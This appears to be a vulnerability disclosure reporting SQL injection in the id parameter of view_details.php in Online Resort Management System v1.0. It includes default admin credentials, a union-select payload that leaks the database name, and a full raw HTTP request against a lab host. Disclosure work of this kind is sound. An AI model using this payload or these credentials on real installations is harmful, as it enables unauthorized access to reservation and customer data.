# Online Resort Management System v1.0 by sourcecodester has SQL injection 1

BUG_Author: huliangjia

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/15126/online-resort-management-system-using-phpoop-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /orms/admin/reservations/view_details.php

Vulnerability location: /orms/admin/reservations/view_details.php?id=, id

dbname = orms_db

[+] Payload: /orms/admin/reservations/view_details.php?id=-2%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12,13,14--+ // Leak place ---> id

```sql
GET /orms/admin/reservations/view_details.php?id=-2%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12,13,14--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=eip4v1c8uqq26lj07th6057jko
Connection: close


```

<img width="1283" height="888" alt="image" src="https://github.com/user-attachments/assets/4fc11a9a-3621-4f28-a573-2543fd6ed11d" />
